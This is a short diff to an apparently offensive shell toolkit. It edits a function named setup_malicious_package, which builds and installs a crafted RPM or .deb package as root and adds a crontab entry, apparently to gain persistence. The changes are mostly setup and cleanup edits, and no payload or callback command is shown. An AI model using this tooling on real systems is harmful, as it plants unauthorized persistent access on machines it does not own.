@@ -2722,6 +2722,8 @@ setup_malicious_package() {
 	local ip=""
 	local port=""
 	local mechanism=""
+	local os_version=""
+	local architecture=""
 
 	if ! check_root; then
 		echo "Error: This function can only be run as root."
@@ -2772,16 +2774,22 @@ setup_malicious_package() {
 
 	case $mechanism in
 		--rpm )
-
 			if ! command -v rpm &> /dev/null; then
-				echo "Warning: RPM does not seem to be available. It might not work."
-				return 1
+					echo "Warning: RPM does not seem to be available. It might not work."
+					return 1
 			fi
 
 			if ! command -v rpmbuild &> /dev/null; then
-				echo "Error: rpmbuild is not installed."
-				exit 1
+					echo "Error: rpmbuild is not installed."
+					exit 1
 			fi
+
+			# Ensure the directory structure exists
+			mkdir -p ~/rpmbuild/SPECS
+			mkdir -p ~/rpmbuild/BUILD
+			mkdir -p ~/rpmbuild/RPMS
+			mkdir -p ~/rpmbuild/SOURCES
+			mkdir -p ~/rpmbuild/SRPMS
 
 			# RPM package setup
 			PACKAGE_NAME="alpha"
@@ -2832,7 +2840,6 @@ setup_malicious_package() {
 
 			if ! command -v dpkg &> /dev/null; then
 				echo "Warning: DPKG does not seem to be available. It might not work."
-				return 1
 			fi
 
 			# DPKG package setup
@@ -2861,7 +2868,7 @@ setup_malicious_package() {
 			# Install the .deb package
 			dpkg -i ${PACKAGE_NAME}.deb
 
-			rm -f ${PACKAGE_NAME}
+			rm -rf ${PACKAGE_NAME}
 			rm -rf ${DEB_DIR}
 
 			# Add crontab entry for the current user
